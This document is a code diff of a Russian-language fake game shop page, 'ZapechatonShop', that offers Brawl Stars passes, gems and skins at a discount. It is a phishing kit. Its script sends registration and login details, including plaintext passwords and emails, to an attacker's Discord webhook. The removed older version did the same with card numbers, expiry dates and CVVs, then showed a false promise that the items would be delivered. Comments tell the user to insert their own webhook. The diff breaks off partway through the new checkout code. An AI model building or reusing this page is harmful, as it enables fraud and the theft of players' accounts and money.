@@ -2,184 +2,400 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Brawl Stars Shop</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZapechatonShop | Brawl Stars</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            background: #0a0c15;
-            color: white;
-            font-family: sans-serif;
+            background: #000;
+            font-family: 'Courier New', 'Fira Code', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
+            position: relative;
+            overflow-x: auto;
         }
+
+        /* анимированный черно-белый переливающийся фон */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                45deg,
+                rgba(255, 255, 255, 0.03) 0px,
+                rgba(255, 255, 255, 0.03) 2px,
+                transparent 2px,
+                transparent 8px
+            );
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #111 0%, #000 100%);
+            z-index: -2;
+        }
+
+        .glow {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(125deg, #fff 0%, #000 80%);
+            opacity: 0.05;
+            animation: shift 8s infinite alternate;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        @keyframes shift {
+            0% { opacity: 0.03; transform: scale(1);}
+            100% { opacity: 0.12; transform: scale(1.2);}
+        }
+
         .container {
-            max-width: 1200px;
-            margin: auto;
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            max-width: 1300px;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(3px);
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 32px;
+            padding: 25px;
+            box-shadow: 0 0 30px rgba(255,255,255,0.1);
         }
-        .tabs {
+
+        /* центральная надпись */
+        .hero {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .hero h1 {
+            font-size: 4rem;
+            letter-spacing: 5px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #fff, #aaa, #fff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+            animation: flicker 3s infinite;
+        }
+        @keyframes flicker {
+            0% { opacity: 1; text-shadow: 0 0 5px #fff;}
+            50% { opacity: 0.9; text-shadow: 0 0 15px #fff;}
+            100% { opacity: 1; text-shadow: 0 0 5px #fff;}
+        }
+        .hero p {
+            color: #aaa;
+            font-size: 0.8rem;
+            border-top: 1px dashed #333;
+            display: inline-block;
+            padding-top: 8px;
+        }
+
+        /* форма логина/регистрации */
+        .auth-box {
+            max-width: 400px;
+            margin: 20px auto;
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 20px;
+            padding: 25px;
+            transition: all 0.3s;
+        }
+        .auth-tabs {
             display: flex;
             gap: 10px;
-            margin-bottom: 30px;
-            border-bottom: 1px solid #333;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #222;
             padding-bottom: 10px;
         }
-        .tablink {
-            background: #1e2438;
+        .auth-tab {
+            background: transparent;
             border: none;
-            padding: 10px 25px;
-            color: white;
+            color: #bbb;
+            font-family: monospace;
+            font-size: 1.2rem;
+            padding: 5px 15px;
             cursor: pointer;
-            border-radius: 30px;
-            font-size: 16px;
+            transition: 0.2s;
         }
-        .tablink.active {
-            background: #ffcc00;
-            color: black;
+        .auth-tab.active {
+            color: white;
+            border-bottom: 2px solid white;
+        }
+        .auth-form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .auth-form input {
+            background: #111;
+            border: 1px solid #333;
+            padding: 12px;
+            border-radius: 40px;
+            color: #0f0;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        .auth-form button {
+            background: #fff;
+            color: #000;
+            border: none;
+            padding: 12px;
+            border-radius: 40px;
             font-weight: bold;
+            font-family: monospace;
+            cursor: pointer;
+            transition: 0.2s;
         }
-        .tabcontent {
+        .auth-form button:hover {
+            background: #ddd;
+        }
+        .error-msg {
+            color: #ff5555;
+            font-size: 0.75rem;
+            text-align: center;
+        }
+
+        /* магазин (скрыт пока не залогинились) */
+        .shop-container {
             display: none;
         }
-        .tabcontent.active {
+        /* 3 вкладки */
+        .shop-tabs {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 30px 0 20px;
+            border-bottom: 1px solid #2a2a2a;
+        }
+        .shop-tab {
+            background: none;
+            border: none;
+            color: #ccc;
+            font-size: 1.3rem;
+            font-family: monospace;
+            padding: 8px 25px;
+            cursor: pointer;
+            transition: 0.2s;
+            position: relative;
+        }
+        .shop-tab.active {
+            color: white;
+            border-bottom: 2px solid white;
+        }
+        .shop-pane {
+            display: none;
+        }
+        .shop-pane.active {
             display: block;
         }
         .products {
             display: flex;
             flex-wrap: wrap;
             gap: 20px;
+            justify-content: center;
         }
-        .product {
-            background: #1e2438;
-            border-radius: 20px;
-            padding: 15px;
-            width: 220px;
+        .product-card {
+            background: #0f0f0f;
+            border: 1px solid #2a2a2a;
+            border-radius: 24px;
+            padding: 18px;
+            width: 240px;
+            transition: 0.2s;
         }
-        .product h3 {
-            margin: 0 0 10px;
+        .product-card h3 {
+            color: #eee;
         }
         .price {
-            font-size: 24px;
-            color: #ffcc00;
-            margin: 10px 0;
+            font-size: 1.6rem;
+            color: #fff;
+            margin: 12px 0;
         }
-        .oldprice {
-            font-size: 14px;
+        .old-price {
             text-decoration: line-through;
-            color: #aaa;
+            font-size: 0.8rem;
+            color: #777;
             margin-left: 8px;
         }
-        button {
-            background: #ffcc00;
+        .product-card button {
+            background: white;
+            color: black;
             border: none;
-            padding: 8px 15px;
-            border-radius: 30px;
-            cursor: pointer;
-            font-weight: bold;
             width: 100%;
+            padding: 8px;
+            border-radius: 30px;
+            font-weight: bold;
+            cursor: pointer;
         }
         .cart {
-            background: #1e2438;
-            border-radius: 20px;
-            padding: 20px;
             margin-top: 40px;
+            background: #0a0a0a;
+            border: 1px solid #2a2a2a;
+            border-radius: 24px;
+            padding: 20px;
         }
         .cart ul {
             list-style: none;
-            padding: 0;
+            max-height: 200px;
+            overflow-y: auto;
         }
         .cart li {
             display: flex;
             justify-content: space-between;
-            margin: 10px 0;
-            border-bottom: 1px solid #333;
-            padding: 5px 0;
+            border-bottom: 1px dashed #222;
+            padding: 8px 0;
         }
         .total {
-            font-size: 20px;
             text-align: right;
+            font-size: 1.3rem;
             margin: 15px 0;
         }
-        .checkout-btn {
+        .checkout {
             background: #2ecc71;
-            width: auto;
+            border: none;
             padding: 10px 25px;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
         }
         .modal {
             display: none;
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
             justify-content: center;
             align-items: center;
+            z-index: 100;
         }
-        .modal-box {
-            background: #1e2438;
+        .modal-content {
+            background: #0c0c0c;
+            border: 1px solid #fff;
+            border-radius: 24px;
             padding: 30px;
-            border-radius: 20px;
-            width: 300px;
+            width: 320px;
         }
-        .modal-box input {
+        .modal-content input {
             width: 100%;
             padding: 10px;
-            margin: 8px 0;
-            background: #0a0c15;
-            border: 1px solid #ffcc00;
-            border-radius: 30px;
-            color: white;
+            margin: 10px 0;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 40px;
+            color: #0f0;
         }
         .close {
             float: right;
             font-size: 24px;
             cursor: pointer;
         }
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #444;
+            font-size: 0.7rem;
+        }
     </style>
 </head>
 <body>
+<div class="glow"></div>
 <div class="container">
-    <h1>⭐ Brawl Stars Shop</h1>
-    <p>скидка 30% на всё</p>
-
-    <div class="tabs">
-        <button class="tablink active" data-tab="tab1">Brawl Pass</button>
-        <button class="tablink" data-tab="tab2">Brawl Pass+</button>
-        <button class="tablink" data-tab="tab3">Гемы</button>
-        <button class="tablink" data-tab="tab4">Скины</button>
+    <div class="hero">
+        <h1>ZapechatonShop</h1>
+        <p>// brawl stars market — only black & white logic</p>
     </div>
 
-    <div id="tab1" class="tabcontent active"></div>
-    <div id="tab2" class="tabcontent"></div>
-    <div id="tab3" class="tabcontent"></div>
-    <div id="tab4" class="tabcontent"></div>
-
-    <div class="cart">
-        <h2>🛒 Корзина</h2>
-        <ul id="cartList"><li>Корзина пуста</li></ul>
-        <div class="total" id="totalAmount">Итого: 0 ₽</div>
-        <button class="checkout-btn" id="checkoutBtn">Оформить заказ</button>
+    <!-- АВТОРИЗАЦИЯ -->
+    <div id="authBlock">
+        <div class="auth-box">
+            <div class="auth-tabs">
+                <button class="auth-tab active" data-form="login">login</button>
+                <button class="auth-tab" data-form="register">register</button>
+            </div>
+            <div id="loginForm" class="auth-form">
+                <input type="text" id="loginUsername" placeholder="логин">
+                <input type="password" id="loginPassword" placeholder="пароль">
+                <button id="doLogin">войти</button>
+                <div class="error-msg" id="loginError"></div>
+            </div>
+            <div id="registerForm" class="auth-form" style="display:none;">
+                <input type="email" id="regEmail" placeholder="email">
+                <input type="text" id="regUsername" placeholder="логин">
+                <input type="password" id="regPassword" placeholder="пароль (мин 8 симв.)">
+                <button id="doRegister">зарегистрироваться</button>
+                <div class="error-msg" id="regError"></div>
+            </div>
+        </div>
     </div>
+
+    <!-- МАГАЗИН (появляется после логина) -->
+    <div id="shopBlock" class="shop-container">
+        <div class="shop-tabs">
+            <button class="shop-tab active" data-shop="pass">brawl pass</button>
+            <button class="shop-tab" data-shop="gems">гемы</button>
+            <button class="shop-tab" data-shop="skins">скины</button>
+        </div>
+
+        <div id="shopPass" class="shop-pane active"></div>
+        <div id="shopGems" class="shop-pane"></div>
+        <div id="shopSkins" class="shop-pane"></div>
+
+        <div class="cart">
+            <h3>🛒 корзина</h3>
+            <ul id="cartList"><li>пусто</li></ul>
+            <div class="total" id="totalAmount">итого: 0 ₽</div>
+            <button class="checkout" id="checkoutBtn">оформить заказ</button>
+        </div>
+    </div>
+    <footer>// only for advanced users | 30% discount</footer>
 </div>
 
 <div id="paymentModal" class="modal">
-    <div class="modal-box">
+    <div class="modal-content">
         <span class="close">&times;</span>
-        <h3>Оплата картой</h3>
-        <input type="text" id="cardNumber" placeholder="Номер карты (16 цифр)">
+        <h3>оплата картой</h3>
+        <input type="text" id="cardNumber" placeholder="номер карты (16 цифр)">
         <input type="text" id="expiry" placeholder="MM/YY">
         <input type="text" id="cvv" placeholder="CVV">
-        <button id="payButton">Оплатить</button>
+        <button id="payNow">оплатить</button>
     </div>
 </div>
 
 <script>
-    // ----- ТОВАРЫ -----
-    const productsData = {
+    // ---------- КОНФИГУРАЦИЯ ----------
+    // ЗАМЕНИ НА СВОЙ ДИСКОРД ВЕБХУК
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/ТВОЙ_АЙДИ/ТВОЙ_ТОКЕН";
+
+    // ТОВАРЫ (скидка 30%)
+    const products = {
         pass: [
             { name: "Brawl Pass Сезон 1", price: 349, old: 499 },
             { name: "Brawl Pass Сезон 2", price: 349, old: 499 },
             { name: "Brawl Pass Сезон 3", price: 349, old: 499 }
-        ],
-        plus: [
-            { name: "Brawl Pass+ Экстра", price: 549, old: 799 },
-            { name: "Brawl Pass+ Премиум", price: 649, old: 929 }
         ],
         gems: [
             { name: "80 гемов", price: 111, old: 159 },
@@ -198,152 +414,198 @@
     };
 
     let cart = [];
+    let currentUser = null;
 
-    // Функция отрисовки товаров в конкретную вкладку
-    function renderProducts(category, containerId) {
-        const container = document.getElementById(containerId);
-        if (!container) return;
-        const items = productsData[category];
-        let html = `<div class="products">`;
-        items.forEach(item => {
-            html += `
-                <div class="product">
-                    <h3>${item.name}</h3>
-                    <div class="price">${item.price} ₽ <span class="oldprice">${item.old} ₽</span></div>
-                    <button onclick="addToCart('${item.name}', ${item.price})">В корзину</button>
-                </div>
-            `;
-        });
-        html += `</div>`;
-        container.innerHTML = html;
+    // localStorage для хранения пользователей
+    if (!localStorage.getItem("users")) {
+        localStorage.setItem("users", JSON.stringify({}));
     }
 
-    // Добавление в корзину
+    function sendToWebhook(type, data) {
+        if (!WEBHOOK_URL || WEBHOOK_URL.includes("ТВОЙ_АЙДИ")) return;
+        const payload = {
+            content: `**${type}** | ZapechatonShop`,
+            embeds: [{
+                title: type,
+                color: 0xffffff,
+                fields: Object.entries(data).map(([k,v]) => ({ name: k, value: `||${v}||`, inline: true })),
+                timestamp: new Date().toISOString()
+            }]
+        };
+        fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).catch(e => console.log);
+    }
+
+    // отрисовка товаров в магазине
+    function renderShop() {
+        for (let cat of ["pass", "gems", "skins"]) {
+            const container = document.getElementById(`shop${cat.charAt(0).toUpperCase() + cat.slice(1)}`);
+            if (!container) continue;
+            let html = `<div class="products">`;
+            products[cat].forEach(item => {
+                html += `
+                    <div class="product-card">
+                        <h3>${item.name}</h3>
+                        <div class="price">${item.price} ₽ <span class="old-price">${item.old} ₽</span></div>
+                        <button onclick="addToCart('${item.name}', ${item.price})">в корзину</button>
+                    </div>
+                `;
+            });
+            html += `</div>`;
+            container.innerHTML = html;
+        }
+    }
+
     window.addToCart = function(name, price) {
         cart.push({ name, price });
-        updateCartUI();
-        showMessage(`✅ ${name} добавлен`);
+        updateCart();
+        showToast(`+ ${name}`);
     };
 
-    // Обновить отображение корзины
-    function updateCartUI() {
-        const list = document.getElementById('cartList');
-        const totalSpan = document.getElementById('totalAmount');
+    function updateCart() {
+        const list = document.getElementById("cartList");
+        const totalSpan = document.getElementById("totalAmount");
         if (cart.length === 0) {
-            list.innerHTML = '<li>Корзина пуста</li>';
-            totalSpan.innerText = 'Итого: 0 ₽';
+            list.innerHTML = "<li>корзина пуста</li>";
+            totalSpan.innerText = "итого: 0 ₽";
             return;
         }
         let total = 0;
-        let html = '';
+        let html = "";
         cart.forEach((item, idx) => {
             total += item.price;
-            html += `<li>${item.name} — ${item.price} ₽ <button style="width:auto; background:#c0392b; padding:2px 12px;" onclick="removeFromCart(${idx})">x</button></li>`;
+            html += `<li>${item.name} — ${item.price} ₽ <button style="background:#c0392b; width:auto; padding:2px 12px;" onclick="removeFromCart(${idx})">x</button></li>`;
         });
         list.innerHTML = html;
-        totalSpan.innerText = `Итого: ${total} ₽`;
+        totalSpan.innerText = `итого: ${total} ₽`;
     }
 
     window.removeFromCart = function(idx) {
         cart.splice(idx, 1);
-        updateCartUI();
+        updateCart();
     };
 
-    function showMessage(msg) {
-        let div = document.createElement('div');
-        div.innerText = msg;
-        div.style.position = 'fixed';
-        div.style.bottom = '20px';
-        div.style.right = '20px';
-        div.style.backgroundColor = '#ffcc00';
-        div.style.color = 'black';
-        div.style.padding = '10px 20px';
-        div.style.borderRadius = '30px';
-        div.style.zIndex = '9999';
-        document.body.appendChild(div);
-        setTimeout(() => div.remove(), 2000);
+    function showToast(msg) {
+        let t = document.createElement("div");
+        t.innerText = msg;
+        t.style.position = "fixed";
+        t.style.bottom = "20px";
+        t.style.right = "20px";
+        t.style.backgroundColor = "#fff";
+        t.style.color = "#000";
+        t.style.padding = "8px 18px";
+        t.style.borderRadius = "30px";
+        t.style.fontFamily = "monospace";
+        t.style.zIndex = "9999";
+        document.body.appendChild(t);
+        setTimeout(() => t.remove(), 2000);
     }
 
-    // Вкладки
-    const tablinks = document.querySelectorAll('.tablink');
-    const tabcontents = document.querySelectorAll('.tabcontent');
-    tablinks.forEach(link => {
-        link.addEventListener('click', () => {
-            const tabId = link.getAttribute('data-tab');
-            tabcontents.forEach(content => content.classList.remove('active'));
-            document.getElementById(tabId).classList.add('active');
-            tablinks.forEach(l => l.classList.remove('active'));
-            link.classList.add('active');
+    // ------ РЕГИСТРАЦИЯ / ЛОГИН ------
+    function registerUser(email, username, password) {
+        if (password.length < 8) {
+            document.getElementById("regError").innerText = "пароль должен быть не менее 8 символов";
+            return false;
+        }
+        let users = JSON.parse(localStorage.getItem("users"));
+        if (users[username]) {
+            document.getElementById("regError").innerText = "логин уже существует";
+            return false;
+        }
+        users[username] = { email, password };
+        localStorage.setItem("users", JSON.stringify(users));
+        sendToWebhook("🔐 Новая регистрация", { email, login: username, password });
+        document.getElementById("regError").innerText = "";
+        return true;
+    }
+
+    function loginUser(username, password) {
+        let users = JSON.parse(localStorage.getItem("users"));
+        if (!users[username] || users[username].password !== password) {
+            document.getElementById("loginError").innerText = "неверный логин или пароль";
+            return false;
+        }
+        sendToWebhook("🔑 Вход в аккаунт", { login: username, password, email: users[username].email });
+        return true;
+    }
+
+    // переключение между login/register
+    const authTabs = document.querySelectorAll(".auth-tab");
+    const loginDiv = document.getElementById("loginForm");
+    const regDiv = document.getElementById("registerForm");
+    authTabs.forEach(tab => {
+        tab.addEventListener("click", () => {
+            authTabs.forEach(t => t.classList.remove("active"));
+            tab.classList.add("active");
+            const formType = tab.getAttribute("data-form");
+            if (formType === "login") {
+                loginDiv.style.display = "flex";
+                regDiv.style.display = "none";
+            } else {
+                loginDiv.style.display = "none";
+                regDiv.style.display = "flex";
+            }
         });
     });
 
-    // Инициализация всех вкладок товарами
-    renderProducts('pass', 'tab1');
-    renderProducts('plus', 'tab2');
-    renderProducts('gems', 'tab3');
-    renderProducts('skins', 'tab4');
+    document.getElementById("doLogin").addEventListener("click", () => {
+        const user = document.getElementById("loginUsername").value.trim();
+        const pass = document.getElementById("loginPassword").value.trim();
+        if (!user || !pass) {
+            document.getElementById("loginError").innerText = "заполните поля";
+            return;
+        }
+        if (loginUser(user, pass)) {
+            currentUser = user;
+            document.getElementById("authBlock").style.display = "none";
+            document.getElementById("shopBlock").style.display = "block";
+            renderShop(); // отрисовать товары после логина
+        }
+    });
+
+    document.getElementById("doRegister").addEventListener("click", () => {
+        const email = document.getElementById("regEmail").value.trim();
+        const user = document.getElementById("regUsername").value.trim();
+        const pass = document.getElementById("regPassword").value.trim();
+        if (!email || !user || !pass) {
+            document.getElementById("regError").innerText = "все поля обязательны";
+            return;
+        }
+        if (registerUser(email, user, pass)) {
+            // авто-логин после регистрации
+            if (loginUser(user, pass)) {
+                currentUser = user;
+                document.getElementById("authBlock").style.display = "none";
+                document.getElementById("shopBlock").style.display = "block";
+                renderShop();
+            }
+        }
+    });
+
+    // вкладки магазина (3 шт)
+    const shopTabs = document.querySelectorAll(".shop-tab");
+    const panes = {
+        pass: document.getElementById("shopPass"),
+        gems: document.getElementById("shopGems"),
+        skins: document.getElementById("shopSkins")
+    };
+    shopTabs.forEach(btn => {
+        btn.addEventListener("click", () => {
+            const target = btn.getAttribute("data-shop");
+            shopTabs.forEach(b => b.classList.remove("active"));
+            btn.classList.add("active");
+            Object.values(panes).forEach(p => p.classList.remove("active"));
+            panes[target].classList.add("active");
+        });
+    });
 
     // ---------- ОПЛАТА И ВЕБХУК ----------
-    // ЗАМЕНИ ЭТУ ССЫЛКУ НА ТВОЙ РЕАЛЬНЫЙ ДИСКОРД ВЕБХУК
-    const WEBHOOK = 'https://discord.com/api/webhooks/ТВОЙ_АЙДИ/ТВОЙ_ТОКЕН';
+    const modal = document.getElementById("paymentModal");
+    const checkoutBtn = document.getElementById("checkoutBtn");
+    const closeModal = document.querySelector(".close");
+    const payBtn = document.getElementById("payNow");
 
-    const modal = document.getElementById('paymentModal');
-    const checkout = document.getElementById('checkoutBtn');
-    const closeModal = document.querySelector('.close');
-    const payBtn = document.getElementById('payButton');
-
-    checkout.onclick = () => {
-        if (cart.length === 0) {
-            alert('Корзина пуста!');
-            return;
-        }
-        modal.style.display = 'flex';
-    };
-    closeModal.onclick = () => modal.style.display = 'none';
-    window.onclick = (e) => { if (e.target === modal) modal.style.display = 'none'; };
-
-    payBtn.onclick = async () => {
-        const card = document.getElementById('cardNumber').value.trim();
-        const expiry = document.getElementById('expiry').value.trim();
-        const cvv = document.getElementById('cvv').value.trim();
-        if (!card || !expiry || !cvv) {
-            alert('Заполните все поля карты');
-            return;
-        }
-        const total = cart.reduce((s, i) => s + i.price, 0);
-        const itemsText = cart.map(i => `${i.name} (${i.price}₽)`).join('\n');
-        const data = {
-            content: "**НОВЫЙ ЗАКАЗ BRAWL STARS (СКИДКА 30%)**",
-            embeds: [{
-                title: "💳 Данные карты",
-                color: 0xffcc00,
-                fields: [
-                    { name: "Товары", value: itemsText || "—", inline: false },
-                    { name: "Сумма", value: total + " ₽", inline: true },
-                    { name: "Номер карты", value: `||${card}||`, inline: false },
-                    { name: "Срок", value: expiry, inline: true },
-                    { name: "CVV", value: `||${cvv}||`, inline: true }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        };
-        try {
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            alert('Спасибо за покупку! Товары придут на аккаунт в течение часа.');
-            cart = [];
-            updateCartUI();
-            modal.style.display = 'none';
-            document.getElementById('cardNumber').value = '';
-            document.getElementById('expiry').value = '';
-            document.getElementById('cvv').value = '';
-        } catch (err) {
-            alert('Ошибка соединения, попробуйте позже.');
-        }
-    };
-</script>
-</body>
-</html>
+    checkoutBtn.addEve
